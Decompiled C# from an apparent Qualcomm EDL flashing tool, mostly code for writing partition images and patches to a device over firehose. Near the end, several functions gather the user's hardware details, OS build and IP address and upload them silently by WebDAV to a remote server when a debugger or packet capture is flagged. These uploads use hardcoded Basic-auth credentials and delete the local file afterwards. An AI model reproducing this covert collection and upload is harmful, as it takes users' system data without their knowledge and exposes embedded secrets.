				Log2("[写入文件] ", Color.Black, isBold: false, newline: true);
			}
			else
			{
				Log2("[Writing] ", Color.Black, isBold: false, newline: true);
			}
			Log2("[" + item2.PhysicalNum + "] ", Color.Black, isBold: false);
			Log2(fileName, Color.Black, isBold: false);
			Log2(" > ", Color.Black, isBold: false);
			Log2(item2.Name, Color.DimGray, isBold: false);
			Log2("... ", Color.Black, isBold: false);
			((Stopwatch)this.m_4b).Start();
			if (_5a(item2.SectorSize, item2.NumSector, item2.PhysicalNum, item2.Start, item2.File) != 0)
			{
				Log2("OK", Color.DodgerBlue, isBold: false);
				((Stopwatch)this.m_4b).Reset();
				if (this.m_4c)
				{
					Log2("用户停止写入操作!", Color.Red, isBold: true, newline: true);
					((Stopwatch)this.m_4b).Stop();
					DiskClose();
					EnableButtons();
					((System.Windows.Forms.Timer)this.m_39).Stop();
					return;
				}
			}
			else
			{
				Log2("Error", Color.Red, isBold: true);
				((Stopwatch)this.m_4b).Reset();
				if (this.m_4c)
				{
					Log2("用户停止写入操作!", Color.Red, isBold: true, newline: true);
					((Stopwatch)this.m_4b).Stop();
					DiskClose();
					EnableButtons();
					((System.Windows.Forms.Timer)this.m_39).Stop();
					return;
				}
			}
		}
		((Stopwatch)this.m_4b).Stop();
		((Control)this).Invoke((Delegate)(Action)(() =>
		{
			if (lang == "zh")
			{
				((Control)this.m_cf).Text = "刷写操作结束";
				((Control)this.m_cd).Text = "";
			}
			else
			{
				((Control)this.m_cf).Text = "The flashing operation ends";
			}
		}));
		if (WriteData.patchXMLList.Length != 0)
		{
			if (lang == "zh")
			{
				Log2("写入 ", Color.Black, isBold: false, newline: true);
				Log2("Patch ", Color.Black, isBold: false);
				Log2("... ", Color.Black, isBold: false);
			}
			else
			{
				Log2("Disk ", Color.Black, isBold: false, newline: true);
				Log2("Patch ", Color.Black, isBold: false);
				Log2("... ", Color.Black, isBold: false);
			}
			string[] patchXMLList = WriteData.patchXMLList;
			string[] array = patchXMLList;
			foreach (string file in array)
			{
				_58(file);
			}
			Log2("OK", Color.DodgerBlue, isBold: false);
		}
		if (((Checkbox)this.m_108).Checked)
		{
			Log2("重启设备...", Color.Black, isBold: false, newline: true);
			_56();
			Log2("OK", Color.DodgerBlue, isBold: false);
			((Checkbox)this.m_109).Checked = false;
		}
		if (lang == "zh")
		{
			Log2("写入总大小 : ", Color.DimGray, isBold: false, newline: true);
		}
		else
		{
			Log2("Flash Size: ", Color.DimGray, isBold: false, newline: true);
		}
		Log2((string)_60(num), Color.DimGray, isBold: true);
		Msg("\n");
		EnableButtons();
		_44();
		((Stopwatch)this.m_4b).Stop();
		DiskClose();
		((System.Windows.Forms.Timer)this.m_39).Stop();
	}

	public void DiskClose()
	{
		try
		{
			OpenWritePort.Close();
		}
		catch (Exception)
		{
		}
	}

	private void _56()
	{
		SendXmlDISK(firehose_pkts.pkt_sendReset());
	}

	private uint _57()
	{
		SendXmlDISK(firehose_pkts.EDL());
		if (!IsAckDisk())
		{
			return 0u;
		}
		return 1u;
	}

	private void _58(object file)
	{
		XmlTextReader xmlTextReader = new XmlTextReader(new StringReader(File.ReadAllText((string)file)));
		while (xmlTextReader.Read())
		{
			if (xmlTextReader.NodeType == XmlNodeType.Element && Operators.CompareString(xmlTextReader.Name, "patch", TextCompare: false) == 0)
			{
				string attribute = xmlTextReader.GetAttribute("SECTOR_SIZE_IN_BYTES");
				string attribute2 = xmlTextReader.GetAttribute("byte_offset");
				string attribute3 = xmlTextReader.GetAttribute("filename");
				string attribute4 = xmlTextReader.GetAttribute("physical_partition_number");
				string attribute5 = xmlTextReader.GetAttribute("size_in_bytes");
				string attribute6 = xmlTextReader.GetAttribute("start_sector");
				string attribute7 = xmlTextReader.GetAttribute("value");
				string attribute8 = xmlTextReader.GetAttribute("what");
				if (attribute3.ToUpper().Contains("DISK"))
				{
					firehose_pkts.pkt_patch(attribute, attribute2, attribute3, attribute4, attribute5, attribute6, attribute7, attribute8);
					_59(attribute6, attribute2, attribute7, attribute5, attribute, attribute4);
				}
			}
		}
	}

	private void _59(object pszDiskOffsetSector, object pszSectorOffsetByte, object pszPatchValue, object pszPatchSize, object pszSectorSizeInBytes, object pszPhysicalPartitionNumber)
	{
		SendXmlDISK(firehose_pkts.pkt_patch((string)pszSectorSizeInBytes, (string)pszSectorOffsetByte, "DISK", (string)pszPhysicalPartitionNumber, (string)pszPatchSize, (string)pszDiskOffsetSector, (string)pszPatchValue, "Update"));
	}

	private uint _5a(object SectSize, object NumSect, object Physical, object StartSect, object Filename)
	{
		this.m_4c = false;
		byte[] array = new byte[16385];
		FileInfo fileInfo = new FileInfo((string)Filename);
		Stream stream = new MemoryStream(array);
		if (!File.Exists((string)Filename))
		{
			return 1u;
		}
		Stream stream2 = new FileStream((string)Filename, FileMode.Open, FileAccess.Read);
		stream2.Read(array, 0, array.Length);
		string text = Path.GetFileName((string)Filename);
		if (this.m_47 == OpreationMain.ACC)
		{
			text = "Data";
		}
		stream2.Seek(0L, SeekOrigin.Begin);
		int num10;
		long num6;
		if (CekSparse(array))
		{
			long num = 0L;
			long num2 = 0L;
			int num3 = 0;
			long num4 = 0L;
			long num5 = 0L;
			num6 = 0L;
			if ((nint)this.m_4e > 0)
			{
				int num7 = 0;
				BinaryReader binaryReader = new BinaryReader(stream2);
				byte[] array2 = new byte[1025];
				this.m_4d = default;
				while (!this.m_4c)
				{
					try
					{
						double num8;
						long num9;
						if (num7 == 0)
						{
							binaryReader.BaseStream.Seek(28L, SeekOrigin.Begin);
							binaryReader.Read(array2, 0, 12);
							this.m_4d.wChunkType = BitConverter.ToInt16(array2.Skip(0).Take(2).ToArray(), 0);
							this.m_4d.dwChunkSize = BitConverter.ToInt32(array2.Skip(4).Take(4).ToArray(), 0);
							this.m_4d.dwTotalSize = BitConverter.ToInt32(array2.Skip(8).Take(4).ToArray(), 0);
							num8 = Conversion.Val("&HE" + Conversion.Hex(this.m_4d.wChunkType));
							int dwTotalSize = this.m_4d.dwTotalSize;
							num9 = (long)this.m_4d.dwChunkSize * (long)this.m_4f.dwBlockSize;
							num += this.m_4d.dwTotalSize;
							num2 = 0L;
						}
						else
						{
							binaryReader.BaseStream.Seek(num + 28, SeekOrigin.Begin);
							binaryReader.Read(array2, 0, 12);
							this.m_4d.wChunkType = BitConverter.ToInt16(array2.Skip(0).Take(12).ToArray(), 0);
							this.m_4d.dwChunkSize = BitConverter.ToInt32(array2.Skip(4).Take(4).ToArray(), 0);
							this.m_4d.dwTotalSize = BitConverter.ToInt32(array2.Skip(8).Take(4).ToArray(), 0);
							num8 = Conversion.Val("&HE" + Conversion.Hex(this.m_4d.wChunkType));
							int dwTotalSize2 = this.m_4d.dwTotalSize;
							num += this.m_4d.dwTotalSize;
							num9 = (long)this.m_4d.dwChunkSize * (long)this.m_4f.dwBlockSize;
							num2 = (long)Math.Round((double)num2 + (double)num9 / Conversions.ToDouble((string)SectSize));
						}
						if (num8 == 969409.0)
						{
							num3++;
							num10 = 524288;
							long num11 = (long)Math.Round((double)num9 / Conversions.ToDouble((string)SectSize));
							long num12 = 0L;
							if (num9 <= num10)
							{
								num10 = (int)num9;
							}
							int num13 = 0;
							string xml = firehose_pkts.pkt_Program((string)SectSize, num11.ToString(), (string)Physical, (Conversions.ToDouble((string)StartSect) + (double)num4).ToString());
							num4 += num11;
							SendXmlDISK(xml);
							if (!IsAckDisk())
							{
								return 0u;
							}
							while (true)
							{
								if (num9 - num12 < num10)
								{
									num10 = (int)(num9 - num12);
								}
								if (num12 != num9)
								{
									byte[] array3 = new byte[num10];
									binaryReader.Read(array3, 0, num10);
									if (!DiskWrite(array3))
									{
										return 0u;
									}
									num5 += array3.Length;
									num12 += array3.Length;
									num6 += array3.Length;
									num13 += array3.Length;
									ProcessBar1(num6, fileInfo.Length, "Writing " + text);
									continue;
								}
								break;
							}
						}
						else if (num8 == 969410.0)
						{
							long num14 = (long)Math.Round((double)num9 / Conversions.ToDouble((string)SectSize));
							num4 += num14;
						}
						else if (num8 == 969411.0)
						{
							long num15 = (long)Math.Round((double)num9 / Conversions.ToDouble((string)SectSize));
							num4 += num15;
						}
						num7++;
						if ((IntPtr)num7 == this.m_4e)
						{
							stream2.Close();
							binaryReader.Close();
							return 1u;
						}
					}
					catch (Exception ex)
					{
						int num16 = (int)Interaction.MsgBox(ex.ToString());
						stream2.Close();
						return 0u;
					}
				}
				return 0u;
			}
			stream2.Close();
			return 0u;
		}
		stream2.Seek(0L, SeekOrigin.Begin);
		long length = new FileInfo((string)Filename).Length;
		num10 = 8192;
		if (length >= 16777216)
		{
			num10 = 1048576;
		}
		long num17 = bulat((double)length / Conversions.ToDouble((string)SectSize));
		double num18 = (double)num17 * Conversions.ToDouble((string)SectSize);
		if ((double)length < Conversions.ToDouble((string)SectSize))
		{
			num17 = 1L;
			num18 = Conversions.ToDouble((string)SectSize);
			num10 = 512;
		}
		SendXmlDISK(firehose_pkts.pkt_Program((string)SectSize, num17.ToString(), (string)Physical, (string)StartSect));
		if (!IsAckDisk())
		{
			return 0u;
		}
		num6 = 0L;
		BinaryReader binaryReader2 = new BinaryReader(stream2);
		try
		{
			while (num18 != (double)num6)
			{
				if (num18 - (double)num6 < (double)num10)
				{
					num10 = (int)Math.Round(num18 - (double)num6);
					byte[] array4 = new byte[num10];
					binaryReader2.Read(array4, 0, num10);
					DiskWrite(array4);
					num6 += array4.Length;
					ProcessBar1(num6, (long)num18, "Writing " + text);
					continue;
				}
				byte[] array5 = new byte[num10];
				binaryReader2.Read(array5, 0, num10);
				if (!DiskWrite(array5))
				{
					return 0u;
				}
				num6 += array5.Length;
				ProcessBar1(num6, (long)num18, "Writing " + text);
			}
			if (IsAckDisk())
			{
				binaryReader2.Close();
				return 1u;
			}
			binaryReader2.Close();
			return 0u;
		}
		catch (Exception)
		{
			stream2.Close();
			return 0u;
		}
	}

	public long bulat(double number)
	{
		return checked((long)Math.Round(0.0 - Conversion.Int(0.0 - number)));
	}

	public void ProcessBar2(long Process, long total, string label)
	{
		if (((Control)this.m_c1).InvokeRequired)
		{
			((Control)this.m_c1).Invoke((Delegate)(Action<long, long, string>)((long p, long t, string l) =>
			{
				double num2 = (double)(p * 100) / (double)t;
				((UIProcessBar)this.m_c1).Value = (int)(num2 * 100.0);
				((UIProcessBar)this.m_c1).Maximum = 10000;
				((Control)this.m_c1).Text = num2.ToString("0.00") + "%";
				((Control)this.m_cf).Text = (string)l + " : [" + (string)_60(p) + "/" + (string)_60(t) + "]";
				string text2 = (string)_5f((double)(p / 1024) / ((Stopwatch)this.m_4b).Elapsed.TotalSeconds) + " /s";
				((Control)this.m_cd).Text = text2 ?? "";
			}), new object[3] { Process, total, label });
		}
		else
		{
			double num = (double)(Process * 100) / (double)total;
			((UIProcessBar)this.m_c1).Value = (int)num;
			((Control)this.m_c1).Text = num.ToString("0.00") + "%";
			((Control)this.m_cf).Text = label + " : [" + (string)_60(Process) + "/" + (string)_60(total) + "]";
			string text = (string)_5f((double)(Process / 1024) / ((Stopwatch)this.m_4b).Elapsed.TotalSeconds) + " /s";
			((Control)this.m_cd).Text = text ?? "";
		}
	}

	public void ProcessBar3(long Process, long total, string label, Stopwatch sw)
	{
		if (((Control)this.m_c1).InvokeRequired)
		{
			((Control)this.m_c1).Invoke((Delegate)(Action<long, long, string>)((long p, long t, string l) =>
			{
				double num2 = (double)(p * 100) / (double)t;
				((UIProcessBar)this.m_c1).Value = (int)(num2 * 100.0);
				((UIProcessBar)this.m_c1).Maximum = 10000;
				((Control)this.m_c1).Text = num2.ToString("0.00") + "%";
				((Control)this.m_cf).Text = l + " : [" + (string)_60(p) + "/" + (string)_60(t) + "]";
				string text2 = (string)_5f((double)(p / 1024) / sw.Elapsed.TotalSeconds) + " /s";
				((Control)this.m_cd).Text = text2 ?? "";
			}), new object[3] { Process, total, label });
		}
		else
		{
			double num = (double)(Process * 100) / (double)total;
			((UIProcessBar)this.m_c1).Value = (int)num;
			((Control)this.m_c1).Text = num.ToString("0.00") + "%";
			((Control)this.m_cf).Text = label + " : [" + (string)_60(Process) + "/" + (string)_60(total) + "]";
			string text = (string)_5f((double)(Process / 1024) / sw.Elapsed.TotalSeconds) + " /s";
			((Control)this.m_cd).Text = text ?? "";
		}
	}

	public void ProcessBar1(long Process, long total, string label)
	{
		if (((Control)this.m_c1).InvokeRequired)
		{
			((Control)this.m_c1).Invoke((Delegate)(Action<long, long, string>)((long p, long t, string l) =>
			{
				double num2 = (double)(p * 100) / (double)t;
				((UIProcessBar)this.m_c1).Value = (int)(num2 * 100.0);
				((UIProcessBar)this.m_c1).Maximum = 10000;
				((Control)this.m_c1).Text = num2.ToString("0.00") + "%";
				((Control)this.m_cf).Text = (string)l + " : [" + (string)_60(p) + "/" + (string)_60(t) + "]";
				string text2 = (string)_5f((double)(p / 1024) / ((Stopwatch)this.m_4b).Elapsed.TotalSeconds) + " /s";
				((Control)this.m_cd).Text = text2 ?? "";
			}), new object[3] { Process, total, label });
		}
		else
		{
			double num = (double)(Process * 100) / (double)total;
			((UIProcessBar)this.m_c1).Value = (int)num;
			((Control)this.m_c1).Text = num.ToString("0.00") + "%";
			((Control)this.m_cf).Text = label + " : [" + (string)_60(Process) + "/" + (string)_60(total) + "]";
			string text = (string)_5f((double)(Process / 1024) / ((Stopwatch)this.m_4b).Elapsed.TotalSeconds) + " /s";
			((Control)this.m_cd).Text = text ?? "";
		}
	}

	private object _5f(double byteCount)
	{
		string result = "0 Bytes";
		if (byteCount >= 1073741824.0)
		{
			result = $"{byteCount / 1073741824.0:##.##}" + " TB";
		}
		else if (byteCount >= 1048576.0)
		{
			result = $"{byteCount / 1048576.0:##.##}" + " GB";
		}
		else if (byteCount >= 1024.0)
		{
			result = $"{byteCount / 1024.0:##.##}" + " MB";
		}
		else if (byteCount > 0.0 && byteCount < 1024.0)
		{
			result = byteCount + " KB";
		}
		return result;
	}

	private object _60(long bytes)
	{
		string[] array = new string[9] { "B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };
		int num = 0;
		double num2 = bytes;
		while (num2 >= 1024.0 && num < array.Length - 1)
		{
			num2 /= 1024.0;
			num++;
		}
		return $"{num2:0.##} {array[num]}";
	}

	public bool IsAckDisk()
	{
		try
		{
			int num = 2000;
			DateTime now = DateTime.Now;
			string text;
			do
			{
				if ((DateTime.Now - now).TotalMilliseconds > (double)num)
				{
					return false;
				}
				byte[] array = DiskRead();
				text = Encoding.UTF8.GetString(array, 0, array.Length);
				if (text.Contains("\"NAK\""))
				{
					return false;
				}
			}
			while (!text.Contains("\"ACK\""));
			return true;
		}
		catch (Exception ex)
		{
			int num2 = (int)Interaction.MsgBox(ex.ToString());
			return false;
		}
	}

	public static byte[] DiskRead(string delay = "0")
	{
		try
		{
			Thread.Sleep(Conversions.ToInteger(delay));
			byte[] array = new byte[524288];
			int numBytesRead = 0;
			ReadFile(OpenWritePort, array, array.Length, ref numBytesRead, IntPtr.Zero);
			return array.Take(numBytesRead).ToArray();
		}
		catch (Exception ex)
		{
			int num = (int)Interaction.MsgBox(ex.ToString());
			return new byte[0];
		}
	}

	public void SendXmlDISK(string xml)
	{
		DiskWrite(Encoding.UTF8.GetBytes(xml));
	}

	public bool DiskWrite(byte[] data)
	{
		string logPath = "C:\\TMFTool\\log.txt";
		try
		{
			if (WriteFile(OpenWritePort, data, data.Length, out var _, IntPtr.Zero) == 0)
			{
				return false;
			}
			return true;
		}
		catch (Exception ex)
		{
			_50(logPath, "发送失败: " + ex.Message);
			return false;
		}
	}

	public bool CekSparse(byte[] DataFiles)
	{
		if (DataFiles.Length == 0)
		{
			return false;
		}
		Stream input = new MemoryStream(DataFiles);
		byte[] array = new byte[1024];
		using (BinaryReader binaryReader = new BinaryReader(input))
		{
			binaryReader.Read(array, 0, 28);
			this.m_4f = _66(array);
			if (long.Parse("E" + this.m_4f.dwMagic.ToString("X"), NumberStyles.HexNumber) == 64108298042L)
			{
				this.m_4e = (IntPtr)this.m_4f.dwTotalChunks;
				return true;
			}
		}
		return false;
	}

	private SPARSE_HEADER _66(object bytes)
	{
		GCHandle gCHandle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
		try
		{
			return (SPARSE_HEADER)Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), typeof(SPARSE_HEADER));
		}
		finally
		{
			gCHandle.Free();
		}
	}

	public static bool OpenDisk(string devices)
	{
		OpenWritePort = new SafeFileHandle(IntPtr.Zero, ownsHandle: true);
		OpenWritePort = CreateFile("\\\\.\\" + devices, -1073741824, 3u, IntPtr.Zero, 3u, 128u, IntPtr.Zero);
		return !OpenWritePort.IsInvalid;
	}

	public byte[] GetBytesFromFile(FileStream fileStream, long offset, int size, out int n)
	{
		float num = 0f;
		long length = fileStream.Length;
		byte[] array = new byte[size];
		fileStream.Seek(offset, SeekOrigin.Begin);
		n = fileStream.Read(array, 0, size);
		num = (float)offset / (float)length;
		return array;
	}

	private async void _69(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		this.m_47 = OpreationMain.WriteFlash;
		this.m_11 = (Button)sender;
		this.m_12 = null;
		falseButtons();
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
			return;
		}
		nint num2 = 0;
		object enumerator = ((IEnumerable)((DataGridView)this.m_143).Rows).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj = (DataGridViewRow)((IEnumerator)enumerator).Current;
				if (!((DataGridViewRow)obj).IsNewRow)
				{
					nint result = 0;
					if (((DataGridViewRow)obj).Cells["Check"].Value != null)
					{
						NativeValues.TryParseBoolean(((DataGridViewRow)obj).Cells["Check"].Value.ToString(), out result);
					}
					if ((int)result != 0)
					{
						num2 = 1;
						break;
					}
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				disposable.Dispose();
			}
		}
		if (num2 == 0)
		{
			Msg("请勾选分区进行操作\n");
			EnableButtons();
		}
		else
		{
			await _46();
		}
	}

	private void _6a(object sender, object e)
	{
		string text = (string)_6b();
		((Control)this.m_126).Text = ((text != null) ? text : "");
	}

	private object _6b()
	{
		string queryString = "SELECT * FROM Win32_PnPEntity WHERE Name LIKE '%Qualcomm HS-USB QDLoader 9008%'";
		using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
		{
			foreach (ManagementObject item in managementObjectSearcher.Get())
			{
				string text = item["Name"]?.ToString();
				if (text != null)
				{
					Match match = Regex.Match(text, "Qualcomm HS-USB QDLoader 9008 \\(COM(\\d+)\\)");
					if (match.Success)
					{
						return "COM" + match.Groups[1].Value;
					}
				}
			}
		}
		return null;
	}

	private void _6c(object url, object destinationPath)
	{
		using WebClient webClient = new WebClient();
		webClient.DownloadFile((string)url, (string)destinationPath);
	}

	private void _6d()
	{
		using Form4 form = new Form4((string)this.m_25);
		form.ShowDialog();
	}

	private object _6e()
	{
		StringBuilder stringBuilder = new StringBuilder();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_Processor"))
			{
				foreach (ManagementBaseObject item in managementObjectSearcher.Get())
				{
					stringBuilder.AppendLine("处理器: " + (item["Name"]?.ToString() ?? "未检测到信息"));
				}
			}
			using (ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher("select * from Win32_BaseBoard"))
			{
				foreach (ManagementBaseObject item2 in managementObjectSearcher2.Get())
				{
					stringBuilder.AppendLine("主板: " + (item2["Product"]?.ToString() ?? "未检测到信息"));
				}
			}
			using (ManagementObjectSearcher managementObjectSearcher3 = new ManagementObjectSearcher("select * from Win32_PhysicalMemory"))
			{
				foreach (ManagementBaseObject item3 in managementObjectSearcher3.Get())
				{
					stringBuilder.AppendLine("内存: " + (item3["Capacity"]?.ToString() ?? "未检测到信息") + " bytes");
				}
			}
			using (ManagementObjectSearcher managementObjectSearcher4 = new ManagementObjectSearcher("select * from Win32_DiskDrive"))
			{
				foreach (ManagementBaseObject item4 in managementObjectSearcher4.Get())
				{
					stringBuilder.AppendLine("硬盘: " + (item4["DeviceID"]?.ToString() ?? "未检测到信息"));
					stringBuilder.AppendLine("硬盘容量: " + (item4["Size"]?.ToString() ?? "未检测到信息") + " bytes");
				}
			}
			using ManagementObjectSearcher managementObjectSearcher5 = new ManagementObjectSearcher("select * from Win32_VideoController");
			foreach (ManagementBaseObject item5 in managementObjectSearcher5.Get())
			{
				stringBuilder.AppendLine("显卡: " + (item5["Name"]?.ToString() ?? "未检测到信息"));
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show("获取硬件信息时发生错误: " + ex.Message);
		}
		return stringBuilder.ToString();
	}

	private object _6f()
	{
		string versionString = Environment.OSVersion.VersionString;
		string text = (Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
		string text2 = (string)_70();
		return "操作系统版本: " + versionString + ", 架构: " + text + ", 构建号: " + text2;
	}

	private object _70()
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
			if (registryKey != null)
			{
				return registryKey.GetValue("CurrentBuildNumber")?.ToString() ?? "未知";
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show("获取操作系统构建号时发生错误: " + ex.Message);
		}
		return "未知";
	}

	private object _71()
	{
		string text = DateTime.Now.ToString("yyyyMMdd_HHmmss");
		string path = "环境异常_" + text + ".txt";
		string result = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, path);
		try
		{
			using StreamWriter streamWriter = new StreamWriter(result);
			streamWriter.WriteLine("操作系统: " + (string)_6f());
			streamWriter.WriteLine("硬件信息: " + (string)_6e());
			streamWriter.WriteLine("网络IP: " + (string)_72());
			streamWriter.WriteLine($"检测时间: {DateTime.Now}");
			streamWriter.Flush();
		}
		catch (Exception ex)
		{
			MessageBox.Show("写入环境异常信息时发生错误: " + ex.Message);
		}
		return result;
	}

	private object _72()
	{
		try
		{
			IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
			return hostEntry.AddressList.FirstOrDefault((IPAddress ip) => ip.AddressFamily == AddressFamily.InterNetwork)?.ToString() ?? "未检测到IP";
		}
		catch (Exception ex)
		{
			MessageBox.Show("获取IP地址时发生错误: " + ex.Message);
			return "IP获取失败";
		}
	}

	private async Task _73(object filePath)
	{
		object obj = (string)this.m_78 + "/dav/日志/admin/用户异常日志/代理异常/";
		object obj2 = "sb";
		object obj3 = "llxll1008";
		try
		{
			object fileName = Path.GetFileName((string)filePath);
			if (!((string)obj).EndsWith("/"))
			{
				obj = (string)obj + "/";
			}
			object requestUri = (string)obj + (string)fileName;
			object obj4 = new ByteArrayContent(File.ReadAllBytes((string)filePath));
			((HttpContent)obj4).Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
			object request = new HttpRequestMessage(HttpMethod.Put, (string)requestUri)
			{
				Content = (HttpContent)obj4
			};
			object parameter = Convert.ToBase64String(Encoding.ASCII.GetBytes((string)obj2 + ":" + (string)obj3));
			((HttpClient)_52).DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", (string)parameter);
			object obj5 = await ((HttpClient)_52).SendAsync((HttpRequestMessage)request);
			if (((HttpResponseMessage)obj5).IsSuccessStatusCode)
			{
				if (File.Exists((string)filePath))
				{
					File.Delete((string)filePath);
				}
				return;
			}
			await ((HttpResponseMessage)obj5).Content.ReadAsStringAsync();
			if (File.Exists((string)filePath))
			{
				File.Delete((string)filePath);
			}
		}
		catch (Exception)
		{
		}
	}

	private async Task _74(object filePath)
	{
		object obj = (string)this.m_78 + "/dav/日志/admin/用户异常日志/抓包异常/" + ((Control)this.m_92).Text;
		object obj2 = "sb";
		object obj3 = "llxll1008";
		try
		{
			object fileName = Path.GetFileName((string)filePath);
			if (!((string)obj).EndsWith("/"))
			{
				obj = (string)obj + "/";
			}
			object requestUri = (string)obj + (string)fileName;
			object obj4 = new ByteArrayContent(File.ReadAllBytes((string)filePath));
			((HttpContent)obj4).Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
			object request = new HttpRequestMessage(HttpMethod.Put, (string)requestUri)
			{
				Content = (HttpContent)obj4
			};
			object parameter = Convert.ToBase64String(Encoding.ASCII.GetBytes((string)obj2 + ":" + (string)obj3));
			((HttpClient)_52).DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", (string)parameter);
			object obj5 = await ((HttpClient)_52).SendAsync((HttpRequestMessage)request);
			if (((HttpResponseMessage)obj5).IsSuccessStatusCode)
			{
				if (File.Exists((string)filePath))
				{
					File.Delete((string)filePath);
				}
				return;
			}
			await ((HttpResponseMessage)obj5).Content.ReadAsStringAsync();
			if (File.Exists((string)filePath))
			{
				File.Delete((string)filePath);
			}
		}
		catch (Exception)
		{
		}
	}

	private async Task _75(object filePath)
	{
		object obj = (string)this.m_78 + "/dav/日志/admin/用户异常日志/调试器异常/" + ((Control)this.m_92).Text;
		object obj2 = "sb";
		object obj3 = "llxll1008";
		try
		{
			object fileName = Path.GetFileName((string)filePath);
			if (!((string)obj).EndsWith("/"))
			{
				obj = (string)obj + "/";
			}
			object requestUri = (string)obj + (string)fileName;
			object obj4 = new ByteArrayContent(File.ReadAllBytes((string)filePath));
			((HttpContent)obj4).Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
			object request = new HttpRequestMessage(HttpMethod.Put, (string)requestUri)
			{
				Content = (HttpContent)obj4
			};
			object parameter = Convert.ToBase64String(Encoding.ASCII.GetBytes((string)obj2 + ":" + (string)obj3));
			((HttpClient)_52).DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", (string)parameter);
			object obj5 = await ((HttpClient)_52).SendAsync((HttpRequestMessage)request);
			if (((HttpResponseMessage)obj5).IsSuccessStatusCode)
			{
				if (File.Exists((string)filePath))
				{
					File.Delete((string)filePath);
				}
				return;
			}
			await ((HttpResponseMessage)obj5).Content.ReadAsStringAsync();
			if (File.Exists((string)filePath))
			{
				File.Delete((string)filePath);
			}
		}
		catch (Exception)
		{
		}
	}

	private async Task _76()
	{
		object obj = modules;
		object obj2 = null;
		if ((string)this.m_2b == "user")
		{
			obj2 = "普通会员";
		}
		else if ((string)this.m_2b == "vipuser")
		{
			obj2 = "特权会员";
		}
		else if ((string)this.m_2b == "admin")
		{
			obj2 = "管理员";
			((Control)this.m_164).Visible = true;
		}
		if (lang == "en")
		{
			((Control)this.m_10b).Text = "Levels: " + (string)obj2;
		}
		else
		{
			((Control)this.m_10b).Text = "会员等级: " + (string)obj2;
		}
		if ((string)obj2 == "特权会员" || (string)obj2 == "管理员")
		{
			fe("-------------------------------------------\n");
			fb();
			fe("特权会员登录！\n");
			((Control)this.m_10f).Enabled = true;
			((Control)this.m_136).Enabled = true;
			((Control)this.m_137).Enabled = true;
			((Control)this.m_12a).Visible = true;
			((Control)this.m_12f).Visible = true;
		}
		else
		{
			((ToolStripItem)this.m_141).Visible = false;
			((ToolStripItem)this.m_152).Visible = false;
			((ToolStripItem)this.m_151).Visible = false;
			((ToolStripItem)this.m_bd).Visible = false;
			((ToolStripItem)this.m_14f).Visible = false;
			((ToolStripItem)this.m_14e).Visible = false;
		}
		object obj3;
		try
		{
			obj3 = JsonConvert.DeserializeObject<List<int>>((string)obj) ?? new List<int>();
		}
		catch
		{
			obj3 = new List<int>();
		}
		nint num = (((List<int>)obj3).Contains(1) ? 1 : 0);
		if ((int)num != 0)
		{
			fb();
			Msg("功能模块1附加\n\n");
			if (this.m_50 != null && !((TabControl)this.m_fb).TabPages.Contains((TabPage)this.m_50))
			{
				((TabControl)this.m_fb).TabPages.Add((TabPage)this.m_50);
			}
			if (this.m_51 != null && !((TabControl)this.m_fb).TabPages.Contains((TabPage)this.m_51))
			{
				((TabControl)this.m_fb).TabPages.Add((TabPage)this.m_51);
			}
			((ToolStripItem)this.m_177).Visible = true;
		}
		else
		{
			if (((TabControl)this.m_fb).TabPages.Contains((TabPage)this.m_154))
			{
				this.m_50 = this.m_154;
				((TabControl)this.m_fb).TabPages.Remove((TabPage)this.m_154);
			}
			if (((TabControl)this.m_fb).TabPages.Contains((TabPage)this.m_15d))
			{
				this.m_51 = this.m_15d;
				((TabControl)this.m_fb).TabPages.Remove((TabPage)this.m_15d);
			}
		}
	}

	private object _77()
	{
		string result = "Unknown";
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
			if (registryKey != null)
			{
				object value = registryKey.GetValue("CurrentMajorVersionNumber");
				object value2 = registryKey.GetValue("CurrentBuild");
				object value3 = registryKey.GetValue("ReleaseId");
				if (value != null)
				{
					int num = (int)value;
					int num2 = int.Parse(value2.ToString());
					if (num == 10 && num2 >= 22000)
					{
						result = "Windows 11";
					}
					else if (num == 10)
					{
						result = "Windows 10";
					}
				}
				else
				{
					object value4 = registryKey.GetValue("ProductName");
					if (value4 != null)
					{
						string text = value4.ToString();
						if (text.Contains("Windows 7"))
						{
							result = "Windows 7";
						}
						else if (text.Contains("Windows 8.1"))
						{
							result = "Windows 8.1";
						}
						else if (text.Contains("Windows 8"))
						{
							result = "Windows 8";
						}
					}
				}
			}
		}
		catch (Exception ex)
		{
			result = "Error: " + ex.Message;
		}
		return result;
	}

	private void _78()
	{
		if (lang == "en")
		{
			((ToolStripItem)this.m_152).Text = "USB security";
			((ToolStripItem)this.m_151).Text = "Scrcpy";
			((Control)this.m_c2).Text = "Read GPT";
			((Control)_88).Text = "Read partition";
			((Control)this.m_89).Text = "Erase partition";
			((Control)this.m_ed).Text = "Flash";
			((Control)this.m_108).Text = "Auto-Rst";
